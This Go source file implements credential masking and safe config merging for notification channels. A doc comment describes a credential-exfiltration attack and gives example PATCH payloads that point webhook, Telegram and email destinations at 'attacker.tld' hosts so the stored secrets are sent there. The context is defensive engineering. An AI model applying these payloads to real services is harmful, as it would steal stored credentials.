package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for a masked value. When the API echoes a
// credential back it replaces the real content with a value carrying this prefix,
// and the update endpoint, on receiving a value with this prefix, understands it
// as "keep the stored original unchanged".
//
// Using a prefix rather than an empty string or some fixed constant lets it also
// carry a little identifying information (see MaskedValue), so the user can tell
// "which bot this is" without having to re-paste the secret.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              the original is too short, so give no hint
//	"__masked__:…ab12cd"      carries the original's last 6 characters as an identifying hint
//
// Exposing only the last 6 characters is a deliberate choice: the identifying
// information of a Webhook address is in its tail segment (such as WeCom's key or
// Feishu's bot id), while the prefix part is the same across bots and has no
// identifying value. The last 6 characters are not enough to reconstruct the
// credential, but are enough for the person configuring it to recognize "that's
// my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unmodified after the API echoed it back).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with this channel's credential fields
// replaced by masked values.
//
// An unknown channel type returns an empty map rather than the original config —
// better to have the UI show "config unavailable" than to spit the whole
// possibly-credential-bearing original content back out when the channel type
// can't be recognized. Non-credential fields are kept as-is so the UI can still
// display them properly.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// A nested structure like headers is treated as a single credential as a
		// whole: judging each sub-key individually would require every channel to
		// declare another set of "which sub-keys are credentials" rules, whose
		// complexity far outweighs the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination address changed,
// but the caller took no stance on the credential fields". It's returned rather
// than silently allowing it or silently dropping the credentials; see
// PrepareConfigUpdate for the reasoning.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys with no explicit stance
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "the destination address (" + strings.Join(e.Changed, ", ") + ") changed, so you must also re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + "): provide a new value, or explicitly leave them blank to indicate credentials are no longer needed. " +
		"The old credentials are only valid for the old address; continuing to use them means handing them over to the new address."
}

// PrepareConfigUpdate merges a channel config and handles the security-sensitive
// case of a "destination address change".
//
// It replaces a bare MergeConfig on the channel-update path, addressing this
// empirically workable path: the destination address (where the message is sent)
// and the credentials (what identity to send as) are two independent sets of
// fields, and MergeConfig keeps the stored original for any "unmentioned key".
// So anyone who can PATCH a channel only has to **change only the address and say
// nothing about the credentials** to make the server send the real stored
// credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<realToken>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → hands over the username and password after STARTTLS
//
// This path is completely silent, doesn't rely on redirects (so rejecting
// cross-host hops doesn't stop it), and directly defeats the goal of this
// package's masking mechanism — "credentials are not echoed back to the browser".
//
// Rule: as soon as any destination key is changed to a new value, the caller must
// take an explicit stance on **every** credential key:
//   - give a new value → use the new value
//   - explicitly pass an empty string → this field no longer needs a credential (keeps the clearing semantics)
//   - echo back the masked value / simply omit the key → reject
//
// The third case is also rejected because the meaning of a "masked value" is
// precisely "keep using the old credential", and the old credential is valid only
// for the old address. We deliberately don't "auto-discard the credential" here —
// for optional credential fields (webhook's headers, email's password) that would
// silently become "auth is gone but the endpoint returns 200", which is harder to
// troubleshoot than an error. Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (such as webhook's headers, which is an
	// object) has a mask literal embedded inside it, the caller has stuffed the
	// "keep original value" sentinel inside the structure. MergeConfig only
	// recognizes "a string with the prefix" as a mask, so this shape would be
	// stored as-is like an ordinary object — the literal "__masked__" actually
	// lands in the database, after which auth silently fails with no error at all.
	// Better to reject it.
	//
	// This check must go **first**: when the address hasn't changed we take an
	// early return, so placing it later would mean it only covers the "change the
	// address" path (the first version put it in the wrong place, and the test
	// caught it directly).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were actually changed. A masked value means "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// The address didn't change, so do a normal merge (masked values keep the original, empty strings clear, everything else overrides).
		return MergeConfig(stored, incoming), nil
	}

	// The address changed: require an explicit stance on every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submitting a mask sentinel embedded inside a
// non-string structure.
//
// The masking mechanism's premise is that "the whole value is a string". An
// object field like webhook's headers can only be masked as a whole (written as
// the string "__masked__") or submitted in full; stuffing the sentinel inside the
// object neither expresses "keep unchanged" nor avoids being stored in the
// database as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("the content of field %s contains the mask marker %q: this field can only be left entirely blank to keep the existing value, or submitted in full with a new value; a mask placeholder must not be embedded inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. Comparing
// via JSON serialization also handles type differences — the port the frontend
// submits is a number while the one read back from the database is a float64, so
// a direct == would misjudge.
//
// "Blank" must be normalized before comparing: an empty string and "key doesn't
// exist" are the same state in this config model, because MergeConfig treats an
// empty string as an explicit clear and deletes the key outright. Without
// normalization, an optional destination field that is always left blank
// (Telegram's base_url is the only such field: leave it blank to use the official
// address) would take this path —
//
//	on create, base_url:"" is stored  →  the first save has MergeConfig delete the key
//	→ on the second save incoming is "" and stored is missing the key, judged as "the address changed"
//	→ the credential is a masked value → 400 "the destination address changed, please re-enter the credential fields"
//
// After that every save fails unless the user re-pastes the Bot Token, even
// though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "blank".
// The criterion must match MergeConfig's clearing check (strings.TrimSpace(s) == ""),
// otherwise a gap appears where "MergeConfig thinks it should be deleted but
// sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, used for updating a channel config.
//
// Rules:
//   - a key whose value in incoming is masked → keep stored's original (the user didn't change this field)
//   - a key whose value in incoming is an empty string → treated as an explicit clear, delete the key
//   - all other keys → override with incoming's value
//   - a key present in stored but not in incoming → keep (partial-update semantics)
//
// Whether an empty string counts as "clearing" needs to be explicit: the frontend
// form submits unfilled fields as empty strings, and writing that in as a valid
// value would actually clear a field that was "left blank to keep the original".
// Here we choose explicit clearing, because the user has no other way to express
// clearing a misconfigured field (dropping the field could distinguish "not
// provided" from "provided empty", but the UI doesn't use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
